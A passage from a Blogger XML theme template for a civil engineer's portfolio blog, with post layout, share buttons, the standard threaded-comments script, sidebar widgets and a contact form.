                  <div class='date-outer'>
                    <div class='date-posts'>
                      <div class='post-outer'>
                        <div class='post hentry uncustomized-post-template' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
                          <b:if cond='data:post.thumbnailUrl'>
                            <meta expr:content='data:post.thumbnailUrl' itemprop='image_url'/>
                          </b:if>
                          <meta expr:content='data:blog.blogId' itemprop='blogId'/>
                          <meta expr:content='data:post.id' itemprop='postId'/>
                          <a expr:name='data:post.id'/>
                          <b:if cond='data:post.title'>
                            <h3 class='mobile-post-title entry-title' itemprop='headline'>
                              <b:if cond='data:post.link'>
                                <a expr:href='data:post.link'>
                                  <data:post.title/>
                                </a>
                                <b:else/>
                                <b:if cond='data:post.url'>
                                  <b:if cond='data:blog.url != data:post.url'>
                                    <a expr:href='data:post.url'>
                                      <data:post.title/>
                                    </a>
                                    <b:else/>
                                    <data:post.title/>
                                  </b:if>
                                  <b:else/>
                                  <data:post.title/>
                                </b:if>
                              </b:if>
                            </h3>
                          </b:if>
                          <div class='post-header'>
                            <div class='post-header-line-1'/>
                          </div>
                          <div class='post-info' style='margin-bottom:15px;'>
                            <b:if cond='data:top.showAuthor'>
                              <b:if cond='data:post.authorProfileUrl'>
                                <span class='author-info'>
                                  By
                                  <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                    <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                                    <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                                      <span itemprop='name'>
                                        <data:post.author/>
                                      </span>
                                    </a>
                                  </span>
                                </span>
                                <b:else/>
                                <span class='author-info'>
                                  <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                    <span itemprop='name'>
                                      <data:post.author/>
                                    </span>
                                  </span>
                                </span>
                              </b:if>
                            </b:if>
                            <b:if cond='data:top.showTimestamp'>
                              <b:if cond='data:post.url'>
                                <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                                <span class='time-info'>
                                  <i class='fa fa-calendar'/>
                                  <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                                    <abbr class='published updated' expr:title='data:post.timestampISO8601' itemprop='datePublished'>
                                      <data:post.timestamp/>
                                    </abbr>
                                  </a>
                                </span>
                              </b:if>
                            </b:if>
                            <b:if cond='data:blog.pageType != &quot;item&quot;'>
                              <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                                <b:if cond='data:post.allowComments'>
                                  <span class='comment-info'>
                                    <i class='fa fa-comments'/>
                                    <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                                      <b:if cond='data:post.numComments == 0'>
                                        Add Comment 
                                      </b:if>
                                      <b:if cond='data:post.numComments == 1'>
                                        1 Comment 
                                      </b:if>
                                      <b:if cond='data:post.numComments &gt; 1'>
                                        <data:post.numComments/>
                                        Comments 
                                      </b:if>
                                    </a>
                                  </span>
                                </b:if>
                              </b:if>
                            </b:if>
                          </div>
                          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
                            <!-- IKLAN BAWAH JUDUL VERSI MOBILE -->
                            <data:post.body/>
                            <div style='clear: both;'/>
                            <div id='share-buttons-mobile'>
                              <p>
                                Share : 
                              </p>
                              <a expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:blog.url' rel='nofollow' style='background:#3b5998;'>
                                Facebook
                              </a>
                              <a expr:href='&quot;http://plus.google.com/share?url=&quot; + data:blog.url' rel='nofollow' style='background:#c0361a;'>
                                Google+
                              </a>
                              <a expr:href='&quot;https://twitter.com/intent/tweet?url=&quot; + data:blog.url + &quot;&amp;text=&quot; + data:post.title + &quot;&amp;lang=id&quot;' rel='nofollow' style='background:#4099ff;'>
                                Twitter
                              </a>
                              <div class='clear'/>
                            </div>
                            <div id='related-posts-mobile'>
                              <h3>
                                Related Posts :
                              </h3>
                              <b:loop values='data:post.labels' var='label'>
                                <b:if cond='data:label.isLast != &quot;true&quot;'/>
                                <b:if cond='data:blog.pageType == &quot;item&quot;'>
                                  <script expr:src='&quot;/feeds/posts/default/-/&quot; + data:label.name + &quot;?alt=json-in-script&amp;callback=related_results_labels&amp;max-results=5&quot;' type='text/javascript'/>
                                </b:if>
                              </b:loop>
                              <script type='text/javascript'>
                                removeRelatedDuplicates(); printRelatedLabels(); </script>
                            </div>
                          </div>
                        </div>
                        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                          <b:include data='post' name='comment_picker'/>
                        </b:if>
                        <b:if cond='data:blog.pageType == &quot;item&quot;'>
                          <b:include data='post' name='comment_picker'/>
                        </b:if>
                      </div>
                    </div>
                  </div>
                </b:includable>
                <b:includable id='nextprev'>
                  <div class='blog-pager' id='blog-pager'>
                    <b:if cond='data:newerPageUrl'>
                      <span id='blog-pager-newer-link'>
                        <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>
                          <data:newerPageTitle/>
                        </a>
                      </span>
                    </b:if>
                    <b:if cond='data:olderPageUrl'>
                      <span id='blog-pager-older-link'>
                        <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>
                          <data:olderPageTitle/>
                        </a>
                      </span>
                    </b:if>
                    <a class='home-link' expr:href='data:blog.homepageUrl'>
                      <data:homeMsg/>
                    </a>
                    <b:if cond='data:mobileLinkUrl'>
                      <div class='blog-mobile-link'>
                        <a expr:href='data:mobileLinkUrl'>
                          <data:mobileLinkMsg/>
                        </a>
                      </div>
                    </b:if>
                  </div>
                  <div class='clear'/>
                </b:includable>
                <b:includable id='post' var='post'>
                  <div class='sjps entry-content'>
                    <b:if cond='data:blog.pageType == &quot;item&quot;'>
                      <div class='category-title'>
                        <div class='aisa-btn'>
                          <b:if cond='data:post.labels'>
                            <b:loop values='data:post.labels' var='label'>
                              <a expr:href='data:label.url' property='v:title' rel='v:url'><data:label.name/></a>
                            </b:loop>
                            <b:else/>
                          </b:if>
                        </div>
                      </div>
                    </b:if>

                    <b:if cond='data:blog.pageType == &quot;item&quot;'>
                      <b:if cond='data:post.title'>
                        <div style='text-align: center;'>
                          <h5 align='center' class='tc-title tc-title-center' style='margin-bottom: 0;'>
                            <b:if cond='data:post.link'>       
                              <a expr:href='data:post.link'><data:post.title/></a>
                              <b:else/>
                              <b:if cond='data:post.url'>
                                <b:if cond='data:blog.url != data:post.url'>
                                  <a expr:href='data:post.url'><data:post.title/></a>  
                                  <b:else/>
                                  <data:post.title/>
                                </b:if>
                                <b:else/>
                                <data:post.title/>
                              </b:if>
                            </b:if>
                          </h5>
                        </div>
                      </b:if></b:if>


                    <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='description articleBody'>
                      <div class='entry-title'>
                        <b:if cond='data:blog.pageType != &quot;item&quot;'>
                          <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                            <h3 align='center' itemprop='name' style='display:none;'>     
                              <b:if cond='data:post.url'>
                                <b:if cond='data:blog.url != data:post.url'>
                                  <a expr:href='data:post.url'><data:post.title/></a>
                                  <b:else/>
                                  <data:post.title/>
                                </b:if>
                                <b:else/>
                                <data:post.title/>
                              </b:if>
                            </h3>
                            <b:else/>
                            <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                              <h1 class='static-title'><data:post.title/></h1></b:if>
                          </b:if></b:if>
                      </div>


                      <b:if cond='data:blog.pageType == &quot;item&quot;'>
                        <data:post.body/>
                        <b:else/>
                        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                          <data:post.body/>
                          <b:else/>
                          <div class='body-post'>
                            <b:if cond='data:blog.pageType == &quot;index&quot;'>
                              <span expr:id='&quot;p&quot; + data:post.id'><data:post.body/></span>
                              <script type='text/javascript'>var x=&quot;<data:post.title/>&quot;,y=&quot;<data:post.url/>&quot;,z=&quot;<data:post.author/>&quot;,t=&quot;<data:post.timestamp/>&quot;;readmore(&quot;p<data:post.id/>&quot;)</script><b:else/><data:post.body/>

                              <b:else/>
                              <div class='entry-container'>
                                <div class='entry-content'><h1><b:if cond='data:post.link'><a expr:href='data:post.link' expr:title='data:post.title'><data:post.title/></a><b:else/><data:post.title/></b:if></h1><data:post.body/></div></div></b:if></div></b:if></b:if>
                      <div style='clear: both;'/> <!-- clear for photos floats -->
                    </div>


                    <div class='metabypost' style='display:none;'>
                      <span><data:post.title/></span>
                      <img expr:alt='data:post.title' expr:src='data:post.thumbnailUrl'/>
                      <span><data:post.author/></span>
                      <data:post.timestamp/>
                      <span expr:title='data:post.timestamp'/>
                    </div>



                    <b:if cond='data:blog.pageType == &quot;item&quot;'>
                      <div class='post-footer'>
                        <span class='group' id='post-tags'><span id='tags-name'>Tags: </span><b:if cond='data:post.labels'>
                          <b:loop values='data:post.labels' var='label'>
                            <a expr:href='data:label.url' rel='tag'>
                              <data:label.name/>
                            </a>
                            <b:if cond='data:label.isLast != &quot;true&quot;'/>
                          </b:loop>
                          </b:if></span>
                        <ul class='single-share social-pop group'>
                          <li><a expr:data-text='data:post.title' expr:data-via='data:blog.title' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'><i class='fa fa-twitter'/></a></li>
                          <li><a expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'><i class='fa fa-facebook'/></a></li>
                          <li><a expr:href='&quot;https://plus.google.com/u/0/share?url=&quot; + data:post.url' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'><i class='fa fa-google-plus'/></a></li>
                          <li><a expr:href='&quot;http://pinterest.com/pin/create/button/?url=&quot; + data:post.url + &quot;&amp;media=&quot; + data:post.thumbnailUrl + &quot;&amp;description=&quot; + data:post.snippet' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'><i class='fa fa-pinterest'/></a></li>
                        </ul>
                      </div>
                    </b:if>
                  </div>

                  <b:if cond='data:blog.pageType == &quot;item&quot;'>
                    <!-- Author -->
                    <div class='aisa-author'>
                      <div class='aisa-author-info'>
                        <div class='author-avatar'>
                          <script type='text/javascript'>
                            //<![CDATA[
                            function av(a) {
                              var b = a.entry.author[0];
                              c = b.name.$t;
                              d = b.gd$image.src.replace(/\/s[0-9]+(-*c*)\//, "/s107$1/");
                              document.write('<img alt="' + c + '" src="' + d + '" title="' + c + '" avatar avatar-91 photo" height="91" width="91"/>')
                            };
                            //]]>
                          </script>
                          <a href='#'> <script expr:src='&quot;/feeds/posts/default/&quot; + data:post.id + &quot;?alt=json-in-script&amp;amp;callback=av&quot;'/> </a>
                        </div>
                        <div class='author-content'> <a class='author-name' expr:href='data:post.authorProfileUrl' expr:title='data:post.author' rel='author'>
                          <data:post.author/>
                          </a>
                          <!-- A_Bio -->
                          <p>Gagan Sharma is best known for his exceptional consulting service and for his leadership quality. With the love of nature, Gagan is aiming for a green civil engineering. He loves to read and discuss Engineering with like-minded individuals.</p>
                        </div>
                      </div>
                      <ul class='social'>
                        <li><a href='http://twitter.com/gagandai' target='_blank'><i aria-hidden='true' class='fa fa-twitter'/></a>
                        </li>
                        <li><a href='http://facebook.com/gaganshrma' target='_blank'><i aria-hidden='true' class='fa fa-facebook'/></a>
                        </li>
                        <li><a href='http://instagram.com/khokka.gags' target='_blank'><i aria-hidden='true' class='fa fa-instagram'/></a>
                        </li>
                        <li><a href='http://youtube.com' target='_blank'><i aria-hidden='true' class='fa fa-youtube'/></a>
                        </li>
                      </ul>
                    </div>



                  </b:if>



                </b:includable>
                <b:includable id='post-404'>
                  <div class='post-404'>                        
                    <div class='actions-404'>	
                      <div class='ops-404'><span>Ops;</span> Sorry, but the page you were trying to view does not exist.
                      </div>					
                      <div class='title-404'>404</div>
                      <div class='link-404'>
                        <a href='/'><i class='fa fa-car'/> <trans>Back to Home</trans></a>
                      </div></div>
                  </div>
                </b:includable>
                <b:includable id='postQuickEdit' var='post'>
                  <b:if cond='data:post.editUrl'>
                    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
                      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
                        <!-- <img alt='' class='icon-action' height='18' src='http://img2.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/> -->
                        <b style='color:#2A3744;'>
                          <i class='fa fa-pencil'/>
                          Edit
                        </b>
                      </a>
                    </span>
                  </b:if>
                </b:includable>
                <b:includable id='shareButtons' var='post'>
                  <b:if cond='data:top.showEmailButton'>
                    <a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'>
                      <span class='share-button-link-text'>
                        <data:top.emailThisMsg/>
                      </span>
                    </a>
                  </b:if>
                  <b:if cond='data:top.showBlogThisButton'>
                    <a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'>
                      <span class='share-button-link-text'>
                        <data:top.blogThisMsg/>
                      </span>
                    </a>
                  </b:if>
                  <b:if cond='data:top.showTwitterButton'>
                    <a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'>
                      <span class='share-button-link-text'>
                        <data:top.shareToTwitterMsg/>
                      </span>
                    </a>
                  </b:if>
                  <b:if cond='data:top.showFacebookButton'>
                    <a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'>
                      <span class='share-button-link-text'>
                        <data:top.shareToFacebookMsg/>
                      </span>
                    </a>
                  </b:if>
                  <b:if cond='data:top.showOrkutButton'>
                    <a class='goog-inline-block share-button sb-orkut' expr:href='data:post.sharePostUrl + &quot;&amp;target=orkut&quot;' expr:title='data:top.shareToOrkutMsg' target='_blank'>
                      <span class='share-button-link-text'>
                        <data:top.shareToOrkutMsg/>
                      </span>
                    </a>
                  </b:if>
                  <b:if cond='data:top.showDummy'>
                    <div class='goog-inline-block dummy-container'>
                      <data:post.dummyTag/>
                    </div>
                  </b:if>
                </b:includable>
                <b:includable id='status-message'>
                  <b:if cond='data:navMessage'>
                    <div class='status-msg-wrap'>
                      <div class='status-msg-body'>
                        <data:navMessage/>
                      </div>
                      <div class='status-msg-border'>
                        <div class='status-msg-bg'>
                          <div class='status-msg-hidden'>
                            <data:navMessage/>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div style='clear: both;'/>
                  </b:if>
                </b:includable>
                <b:includable id='threaded-comment-form' var='post'>
                  <div class='comment-form'>
                    <a name='comment-form'/>
                    <b:if cond='data:mobile'>
                      <div class='pesan-komentar'>
                        <p>
                          <data:blogCommentMessage/>
                        </p>
                      </div>
                      <data:blogTeamBlogMessage/>
                      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
                      <b:else/>
                      <div class='pesan-komentar'>
                        <p>
                          <data:blogCommentMessage/>
                        </p>
                      </div>
                      <data:blogTeamBlogMessage/>
                      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
                    </b:if>
                    <data:post.friendConnectJs/>
                    <data:post.cmtfpIframe/>
                    <script type='text/javascript'>
                      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
                    </script>
                  </div>
                </b:includable>
                <b:includable id='threaded_comment_js' var='post'>
                  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>
                  <script type='text/javascript'>
                    (function() {
                      var items = <data:post.commentJso/>;
                      var msgs = <data:post.commentMsgs/>;
                      var config = <data:post.commentConfig/>;
                      // <![CDATA[
                      var cursor = null;
                      if (items && items.length > 0) {
                        cursor = parseInt(items[items.length - 1].timestamp) + 1;
                      }
                      var bodyFromEntry = function(entry) {
                        if (entry.gd$extendedProperty) {
                          for (var k in entry.gd$extendedProperty) {
                            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
                              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
                            }
                          }
                        }
                        return entry.content.$t;
                      }
                      var parse = function(data) {
                        cursor = null;
                        var comments = [];
                        if (data && data.feed && data.feed.entry) {
                          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
                            var comment = {};
                            // comment ID, parsed out of the original id format
                            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
                            comment.id = id ? id[2] : null;
                            comment.body = bodyFromEntry(entry);
                            comment.timestamp = Date.parse(entry.published.$t) + '';
                            if (entry.author && entry.author.constructor === Array) {
                              var auth = entry.author[0];
                              if (auth) {
                                comment.author = {
                                  name: (auth.name ? auth.name.$t : undefined),
                                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                                };
                              }
                            }
                            if (entry.link) {
                              if (entry.link[2]) {
                                comment.link = comment.permalink = entry.link[2].href;
                              }
                              if (entry.link[3]) {
                                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                                if (pid && pid[1]) {
                                  comment.parentId = pid[1];
                                }
                              }
                            }
                            comment.deleteclass = 'item-control blog-admin';
                            if (entry.gd$extendedProperty) {
                              for (var k in entry.gd$extendedProperty) {
                                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                                  comment.displayTime = entry.gd$extendedProperty[k].value;
                                }
                              }
                            }
                            comments.push(comment);
                          }
                        }
                        return comments;
                      };
                      var paginator = function(callback) {
                        if (hasMore()) {
                          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
                          if (cursor) {
                            url += '&published-min=' + new Date(cursor).toISOString();
                          }
                          window.bloggercomments = function(data) {
                            var parsed = parse(data);
                            cursor = parsed.length < 50 ? null
                            : parseInt(parsed[parsed.length - 1].timestamp) + 1
                            callback(parsed);
                            window.bloggercomments = null;
                          }
                          url += '&callback=bloggercomments';
                          var script = document.createElement('script');
                          script.type = 'text/javascript';
                          script.src = url;
                          document.getElementsByTagName('head')[0].appendChild(script);
                        }
                      };
                      var hasMore = function() {
                        return !!cursor;
                      };
                      var getMeta = function(key, comment) {
                        if ('iswriter' == key) {
                          var matches = !!comment.author
                          && comment.author.name == config.authorName
                          && comment.author.profileUrl == config.authorUrl;
                          return matches ? 'true' : '';
                        } else if ('deletelink' == key) {
                          return config.baseUri + '/delete-comment.g?blogID='
                          + config.blogId + '&postID=' + comment.id;
                        } else if ('deleteclass' == key) {
                          return comment.deleteclass;
                        }
                        return '';
                      };
                      var replybox = null;
                      var replyUrlParts = null;
                      var replyParent = undefined;
                      var onReply = function(commentId, domId) {
                        if (replybox == null) {
                          // lazily cache replybox, and adjust to suit this style:
                          replybox = document.getElementById('comment-editor');
                          if (replybox != null) {
                            replybox.height = '250px';
                            replybox.style.display = 'block';
                            replyUrlParts = replybox.src.split('#');
                          }
                        }
                        if (replybox && (commentId !== replyParent)) {
                          document.getElementById(domId).insertBefore(replybox.parentNode, null);
                          replybox.src = replyUrlParts[0]
                          + (commentId ? '&parentID=' + commentId : '')
                          + '#' + replyUrlParts[1];
                          replyParent = commentId;
                        }
                      };
                      var hash = (window.location.hash || '#').substring(1);
                      var startThread, targetComment;
                      if (/^comment-form_/.test(hash)) {
                        startThread = hash.substring('comment-form_'.length);
                      } else if (/^c[0-9]+$/.test(hash)) {
                        targetComment = hash.substring(1);
                      }
                      // Configure commenting API:
                      var configJso = {
                        'maxDepth': config.maxThreadDepth
                      };
                      var provider = {
                        'id': config.postId,
                        'data': items,
                        'loadNext': paginator,
                        'hasMore': hasMore,
                        'getMeta': getMeta,
                        'onReply': onReply,
                        'rendered': true,
                        'initComment': targetComment,
                        'initReplyThread': startThread,
                        'config': configJso,
                        'messages': msgs
                      };
                      var render = function() {
                        if (window.goog && window.goog.comments) {
                          var holder = document.getElementById('comment-holder');
                          window.goog.comments.render(holder, provider);
                        }
                      };
                      // render now, or queue to render when library loads:
                      if (window.goog && window.goog.comments) {
                        render();
                      } else {
                        window.goog = window.goog || {};
                        window.goog.comments = window.goog.comments || {};
                        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
                        window.goog.comments.loadQueue.push(render);
                      }
                    })();
                    // ]]>
                  </script>
                </b:includable>
                <b:includable id='threaded_comments' var='post'>
                  <div id='top-comment'>

                    <div class='widget2' id='top-comment1'> 

                      <div class='centerare1'>

                        <div class='comments' id='comments'>
                          <a name='comments'/>
                          <div class='komhead'>
                            <h4>
                              <b:if cond='data:post.numComments == 1'>
                                1 <data:commentLabel/>:
                                <b:else/>
                                <data:post.numComments/> <data:commentLabelPlural/>:
                              </b:if>
                            </h4>
                            <div class='stripe-line'/>
                          </div>
                          <div class='comments-content'>
                            <b:if cond='data:post.embedCommentForm'>
                              <b:include data='post' name='threaded_comment_js'/>
                            </b:if>
                            <div id='comment-holder'>
                              <data:post.commentHtml/>
                            </div>
                          </div>

                          <p class='comment-footer'>
                            <b:if cond='data:post.allowNewComments'>
                              <b:include data='post' name='threaded-comment-form'/>
                              <b:else/>
                              <data:post.noNewCommentsText/>
                            </b:if>
                          </p>

                          <b:if cond='data:showCmtPopup'>
                            <div id='comment-popup'>
                              <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
                              </iframe>
                            </div>
                          </b:if>

                          <div id='backlinks-container'>
                            <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
                              <b:if cond='data:post.showBacklinks'>
                                <b:include data='post' name='backlinks'/>
                              </b:if>
                            </div>
                          </div>
                        </div>		

                      </div>

                    </div>



                  </div>

                  <div style='clear: both;'/>
                </b:includable>
              </b:widget>
            </b:section>
          </div><!-- /main-wrapper -->

          <div class='sidebar-wrapper'>
            <b:section class='sidebar' id='sidebar' showaddelement='yes'>
              <b:widget id='PopularPosts1' locked='false' title='Popular Posts' type='PopularPosts' version='1'>
                <b:widget-settings>
                  <b:widget-setting name='numItemsToShow'>3</b:widget-setting>
                  <b:widget-setting name='showThumbnails'>true</b:widget-setting>
                  <b:widget-setting name='showSnippets'>false</b:widget-setting>
                  <b:widget-setting name='timeRange'>LAST_YEAR</b:widget-setting>
                </b:widget-settings>
                <b:includable id='main'>
                  <b:if cond='data:title'><h2><data:title/></h2></b:if>
                  <div class='widget-content popular-posts'>
                    <ul>
                      <b:loop values='data:posts' var='post'>
                        <li>
                          <b:if cond='data:showThumbnails == &quot;false&quot;'>
                            <b:if cond='data:showSnippets == &quot;false&quot;'>
                              <!-- (1) No snippet/thumbnail -->
                              <a expr:href='data:post.href'><data:post.title/></a>
                              <b:else/>
                              <!-- (2) Show only snippets -->
                              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
                              <div class='item-snippet'><data:post.snippet/></div>
                            </b:if>
                            <b:else/>
                            <b:if cond='data:showSnippets == &quot;false&quot;'>
                              <!-- (3) Show only thumbnails -->
                              <div class='item-thumbnail-only'>
                                <b:if cond='data:post.thumbnail'>
                                  <div class='item-thumbnail'>
                                    <a expr:href='data:post.href' target='_blank'>
                                      <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                                    </a>
                                  </div>
                                </b:if>
                                <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
                              </div>
                              <div style='clear: both;'/>
                              <b:else/>
                              <!-- (4) Show snippets and thumbnails -->
                              <div class='item-content'>
                                <b:if cond='data:post.thumbnail'>
                                  <div class='item-thumbnail'>
                                    <a expr:href='data:post.href' target='_blank'>
                                      <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                                    </a>
                                  </div>
                                </b:if>
                                <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
                                <div class='item-snippet'><data:post.snippet/></div>
                              </div>
                              <div style='clear: both;'/>
                            </b:if>
                          </b:if>
                        </li>
                      </b:loop>
                    </ul>
                    <b:include name='quickedit'/>
                  </div>
                </b:includable>
              </b:widget>
              <b:widget id='Label1' locked='false' title='Labels' type='Label' version='1'>
                <b:widget-settings>
                  <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
                  <b:widget-setting name='display'>CLOUD</b:widget-setting>
                  <b:widget-setting name='selectedLabelsList'/>
                  <b:widget-setting name='showType'>ALL</b:widget-setting>
                  <b:widget-setting name='showFreqNumbers'>false</b:widget-setting>
                </b:widget-settings>
                <b:includable id='main'>
                  <b:if cond='data:title'>
                    <h2><data:title/></h2>
                  </b:if>
                  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
                    <b:if cond='data:display == &quot;list&quot;'>
                      <ul>
                        <b:loop values='data:labels' var='label'>
                          <li>
                            <b:if cond='data:blog.url == data:label.url'>
                              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
                              <b:else/>
                              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
                            </b:if>
                            <b:if cond='data:showFreqNumbers'>
                              <span dir='ltr'>(<data:label.count/>)</span>
                            </b:if>
                          </li>
                        </b:loop>
                      </ul>
                      <b:else/>
                      <b:loop values='data:labels' var='label'>
                        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
                          <b:if cond='data:blog.url == data:label.url'>
                            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
                            <b:else/>
                            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
                          </b:if>
                          <b:if cond='data:showFreqNumbers'>
                            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
                          </b:if>
                        </span>
                      </b:loop>
                    </b:if>
                    <b:include name='quickedit'/>
                  </div>
                </b:includable>
              </b:widget>
            </b:section>

          </div><!-- /sidebar-wrapper -->
          <div class='clr'/>

          <!-- END SINGLE WORK DESIGN AREA -->
        </div>
      </div>
    </div>
  </div>
  
  <!-- ====== Hire ====== -->
  <section class='hire section-padding text-center'>
    <div class='container'>
      <h3>Start Work With Me</h3>
      <a href='#contact'><button>Hire Me</button></a>
    </div>
  </section>
  <!--====== End Hire ======-->

  <section class='section nopaddingbottom' id='contact'>
    <div class='container-fluid'>
      <div class='row'>
        <div class='section-head text-center'>
          <h5 class='tc-title tc-title-center'>Contact Me</h5>
        </div>
        <!-- CONTACT -->
        <div class='container contact-con'>
          <div class='col-md-5 contact_image'>
            <div class='overlay'>
              <div class='contact_info'>
                <div class='item col-md-6 col-sm-6'>
                  <i class='fa fa-user'/>
                  <div>Gagan Sharma</div>
                </div>
                <div class='item col-md-6 col-sm-6'>
                  <i class='fa fa-envelope'/>
                  <div><a href='mailto:gaganshrma@hotmail.com' target='_top'>gaganshrma@hotmail.com</a></div>
                </div>
                <div class='item col-md-6 col-sm-6'>
                  <i class='fa fa-mobile-phone'/>
                  <div>+123-456-789</div>
                </div>
                <div class='item col-md-6 col-sm-6'>
                  <i class='fa fa-map-marker'/>
                  <div>Nepal</div>
                </div>
              </div>
            </div>
          </div>
          <!-- /Contact Image -->

          <!-- Contact Body -->
          <div class='col-md-6 contact_body' style='float: right;'>
            <div class='contact_form'>
              <b:section class='contact-form' id='contact-form' preferred='yes'>
                <b:widget id='ContactForm1' locked='false' title='Contact Form' type='ContactForm' version='1'>
                  <b:includable id='main'>
                    <form id='contactForm' name='contact-form'>


                      <input class='contact_name inputfield' expr:id='data:widget.instanceId + &quot;_contact-form-name&quot;' placeholder='Name* :' required='' type='text'/>


                      <input class='contact_email inputfield' expr:id='data:widget.instanceId + &quot;_contact-form-email&quot;' placeholder='E-mail* :' required='' type='email'/>


                      <textarea class='contact_message inputfield' expr:id='data:widget.instanceId + &quot;_contact-form-email-message&quot;' placeholder='Message* :' required='' type='tel'/>


                      <input class='submit contact_button button' expr:id='data:widget.instanceId + &quot;_contact-form-submit&quot;' expr:value='data:contactFormSendMsg' style='visibility: visible;' type='submit'/>

                      <div style='text-align: center; max-width: 222px; width: 100%'>
                        <p class='contact-form-error-message' expr:id='data:widget.instanceId + &quot;_contact-form-error-message&quot;'/>
                        <p class='contact-form-success-message' expr:id='data:widget.instanceId + &quot;_contact-form-success-message&quot;'/>
                      </div>
                    </form>
                    <b:include name='quickedit'/>
                  </b:includable>
                </b:widget>
                <b:widget id='Attribution1' locked='false' title='' type='Attribution'>
                  <b:widget-settings>
                    <b:widget-setting name='copyright'/>
                  </b:widget-settings>
                  <b:includable id='main'>
    <div class='widget-content' style='text-align: center;'>
